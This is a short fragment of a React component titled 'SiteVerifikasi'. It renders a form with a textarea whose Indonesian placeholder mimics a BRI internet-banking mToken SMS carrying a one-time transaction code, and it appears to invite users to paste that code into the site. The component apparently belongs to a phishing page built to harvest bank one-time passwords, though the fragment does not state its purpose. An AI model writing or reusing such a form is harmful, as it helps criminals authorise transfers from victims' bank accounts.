...
const SiteVerifikasi = ({btnClick}) => {
  ...
  return (        
    <div style={{width:'100%', padding:'0 1rem', color:'#000', marginTop:'2em'}}>  
        ...
        <form>
            <textarea id='msg' className='form-control-pesan' rows={5} placeholder="Contoh: mToken IB BRI IDxxxxxxxxx TRX sebesar xxxxxx adalah xxxxxx Kode berlaku 5 menit."></textarea>
